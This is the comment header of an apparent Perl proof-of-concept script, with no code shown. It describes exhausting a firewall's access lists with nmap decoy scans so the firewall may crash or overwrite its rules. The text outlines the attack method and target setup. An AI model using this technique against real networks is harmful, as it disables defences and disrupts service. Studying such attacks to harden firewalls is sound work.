# PERL script to possibly kill firewall systems that actively block IP
# numbers if the system detects that the IP is scanning more than 20 ports
# on a network behind the firewall.  Works by basically creating a lot of
# decoys with nmap. Router/firewall will try to block all the (decoyed) IP
# numbers, eventually running out of access list/packetfilters, and possibly
# crashing, or overwriting access lists. Make sure your target is a machine
# behind the firewall. Requires nmap.

# This is a proof of concept code - not to be used on live systems.
# Standard disclaimer etc..
